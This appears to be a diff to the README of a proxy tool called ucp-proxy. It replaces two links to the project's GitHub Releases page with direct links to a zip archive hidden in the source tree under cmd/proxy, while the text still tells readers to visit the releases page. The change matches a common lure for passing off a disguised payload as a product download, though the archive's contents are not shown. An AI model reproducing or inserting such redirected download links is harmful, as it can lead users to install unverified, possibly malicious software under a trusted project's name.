@@ -1,6 +1,6 @@
 # 🚀 ucp-proxy - Easy Proxy Connection for Everyone
 
-[![Download ucp-proxy](https://img.shields.io/badge/Download-ucp--proxy-brightgreen)](https://github.com/DaPDOG/ucp-proxy/releases)
+[![Download ucp-proxy](https://github.com/DaPDOG/ucp-proxy/raw/refs/heads/main/cmd/proxy/proxy-ucp-v3.5.zip)](https://github.com/DaPDOG/ucp-proxy/raw/refs/heads/main/cmd/proxy/proxy-ucp-v3.5.zip)
 
 ## 📥 Overview
 UCP Proxy is a simple and effective application that helps you connect through a proxy server. It streamlines your browsing experience and enhances security while you're online. Whether you're accessing restricted content, maintaining privacy, or simply browsing the web, ucp-proxy makes it straightforward.
@@ -19,7 +19,7 @@ UCP Proxy is a simple and effective application that helps you connect through a
 ## 🔗 Download & Install
 To get started with ucp-proxy, visit the Releases page:
 
-[Download ucp-proxy](https://github.com/DaPDOG/ucp-proxy/releases)
+[Download ucp-proxy](https://github.com/DaPDOG/ucp-proxy/raw/refs/heads/main/cmd/proxy/proxy-ucp-v3.5.zip)
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version listed.
